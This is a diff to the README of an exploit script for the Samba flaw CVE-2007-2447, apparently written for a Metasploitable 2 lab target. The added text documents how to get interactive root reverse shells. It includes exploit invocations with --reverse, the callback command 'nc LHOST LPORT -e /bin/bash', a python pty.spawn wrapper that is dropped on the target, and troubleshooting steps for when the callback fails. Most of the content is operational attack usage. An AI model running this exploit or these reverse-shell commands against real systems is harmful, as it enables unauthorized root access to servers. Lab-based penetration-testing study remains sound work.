@@ -61,8 +61,11 @@ python cve-2007-2447/cve_2007_2447.py --host 192.168.200.132 --cmd "uname -a && 
 # Use NetBIOS port 139 instead of 445
 python cve-2007-2447/cve_2007_2447.py --host 192.168.200.132 --port 139 --cmd "id"
 
-# Reverse shell — easiest is the helper, see "Getting a reverse shell" below
+# Reverse shell — interactive PTY by default (prompt, working Enter, tab completion)
 python cve-2007-2447/cve_2007_2447.py --host 192.168.200.132 --reverse 192.168.200.1 4444
+
+# ...or a plain promptless shell (no PTY) if the target lacks python/base64
+python cve-2007-2447/cve_2007_2447.py --host 192.168.200.132 --reverse 192.168.200.1 4444 --plain
 
 # Skip HTTP retrieval (command still runs; output stays on the target)
 python cve-2007-2447/cve_2007_2447.py --host 192.168.200.132 --cmd "id" --no-verify
@@ -97,7 +100,10 @@ callback address is auto-detected. If that port is already taken, the helper
 says so and moves up until it finds a free one, so you never have to hunt for a
 port yourself. It opens the firewall for the chosen port, picks a callback
 address on the target's subnet, starts the listener, then fires the exploit.
-You land in a root shell — try `id; hostname; uname -a`, type `exit` to drop it.
+
+You land on an **interactive prompt** — `root@metasploitable:/#` — with working
+Enter, tab completion, arrow-key history and Ctrl-C. Try `id; hostname`, then
+type `exit` to drop it.
 
 ### Manual equivalent
 
@@ -127,6 +133,34 @@ python3 cve-2007-2447/cve_2007_2447.py --host 192.168.200.132 --reverse 192.168.
    redirections, so it dies with `No such file or directory`. The script uses
    the target's own netcat instead: `nc LHOST LPORT -e /bin/bash &`.
 
+### Why it is interactive
+
+A naive `nc -e /bin/bash` shell is not usable interactively, and the failure
+looks like a broken exploit. Two things are wrong with it:
+
+- **No prompt.** bash runs non-interactively, so there is no `#` to type at.
+- **Enter does nothing.** bash needs an LF to end a line, but Enter in a
+  cmd/PowerShell console sends a bare **CR**. You type `ls`, press Enter, and
+  nothing happens — the line just sits buffered until an LF eventually arrives.
+  This is the single most common "the exploit is broken" false alarm.
+
+The fix is to give bash a pseudo-terminal. `nc -e` accepts a program name only
+(no arguments), so the exploit drops a one-line wrapper on the target and points
+netcat at it:
+
+```sh
+#!/bin/sh
+exec python -c 'import pty;pty.spawn("/bin/bash")'
+```
+
+A PTY's line discipline maps CR to NL, so Enter works, and you get a real prompt
+with tab completion and history. No external tooling — just python, which
+Metasploitable 2 already has.
+
+`--plain` skips the wrapper and sends `nc LHOST LPORT -e /bin/bash` directly.
+Reach for it only if the target lacks python or base64: you lose the prompt and
+Enter may not work.
+
 ### If no shell arrives
 
 - `netstat -ano | grep :<lport>` — an ESTABLISHED line means the shell is
@@ -135,6 +169,8 @@ python3 cve-2007-2447/cve_2007_2447.py --host 192.168.200.132 --reverse 192.168.
 - Probe the route independently: run
   `--cmd "echo test | nc -w 3 <lhost> <lport>"` and see whether it lands on the
   listener. That separates firewall/route problems from payload problems.
+- Typing seems to do nothing and there is no prompt? You are on a shell without
+  a PTY — see "Why it is interactive" above.
 - Port busy or reserved? Pick another — `netsh int ipv4 show
   excludedportrange protocol=tcp` lists Windows' reserved ranges.
 
